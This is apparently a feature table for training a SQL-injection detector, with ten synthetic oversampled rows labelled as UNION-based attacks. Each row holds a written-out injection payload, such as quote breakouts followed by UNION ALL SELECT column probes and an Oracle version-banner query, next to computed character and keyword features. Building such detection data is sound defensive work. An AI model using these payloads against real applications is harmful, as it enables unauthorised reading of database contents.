id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000121,1.0009435173097752,52.9860639740599,21.812750218379243,3.9797924208093445,23.14143820973254,13.62550043675849,10.109562663784434,6.109562663784433,0.4334638396789141,0.25428085971904985,0.1966425355719342,0.1156127650301018,0.703187554594811,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,1.4063751091896224,3.0,0.7031875545948109,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000002,attack,union,"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",nearest_attack_euclidean,R000144,1.263671024017425,59.888690730260635,22.377738146052128,3.8688554498607606,14.0,18.755476292104255,16.755476292104255,10.377738146052128,0.23526754410792183,0.31261491218848614,0.2790052630302116,0.17311228067338036,0.3111309269739364,0.6888690730260638,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.688869073026064,1.0,0.0,2.688869073026064,3.0,0.3111309269739362,0.6888690730260638,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000003,attack,union,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",nearest_attack_euclidean,R000078,0.23660814777201228,112.16613353819237,29.0,4.07884063338686,37.0,42.5329068305539,17.0,15.633226707638475,0.3305735476773775,0.3782953662061563,0.1518851435274437,0.1392459425890225,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.633226707638474,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000004,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000117,0.22209435243595205,86.57197859569695,26.31439571913939,4.0266684803237,25.0,29.25758287655756,22.0,10.31439571913939,0.28898046210556555,0.33763126063109516,0.2543028066528977,0.11908547061044165,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,3.31439571913939,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000005,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000065,0.04102461215134873,55.30293068260502,19.060586136521003,3.8221574954855546,14.0,28.242344546084016,4.0,9.060586136521003,0.25326029407379685,0.5105596639156607,0.07236008402108483,0.1638199579894576,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,5.060586136521004,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000006,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000058,0.3085503500132815,68.38365401871461,20.32326919625708,3.768730820225259,14.0,38.70692321497168,4.0,11.676730803742922,0.20497337225010892,0.5657447174284469,0.05856382064288826,0.17071808967855587,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,7.676730803742921,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000007,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000050,0.4541406714417224,83.47109373931102,29.789843751527,4.213626097408782,29.0,28.84062499389201,15.0,10.630468745419009,0.3478128640120554,0.345264541627629,0.17990320552347694,0.12701938883683864,1.4203124969460055,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.2101562484730026,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000008,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000100,0.7862750030330793,59.35463812992822,20.725773021654703,3.864185161775909,14.0,30.903092086618813,4.0,10.451546043309406,0.23637408828047837,0.5203398501120848,0.0675354537944224,0.17575060781301444,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.7257730216547034,0.0,5.725773021654703,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000009,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,1.8208996381937257,106.49634430679625,26.348903292038873,4.0070228285625245,66.0,4.0,27.597075445436992,8.899268861359248,0.6210820444460301,0.03764133602703218,0.25796476121073736,0.08331185831620039,0.0,0.0,2.0,0.0,1.5503655693203762,2.0,0.0,0.8992688613592478,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.449634430679624,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000010,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000069,0.5727753804954208,100.2008475442973,27.0,3.952607341467893,25.0,44.0,17.88644075225483,13.314406792042472,0.24975498652988992,0.43956877629260627,0.17780929378155652,0.13286694339594726,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.3144067920424718,0.0,0.0,7.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
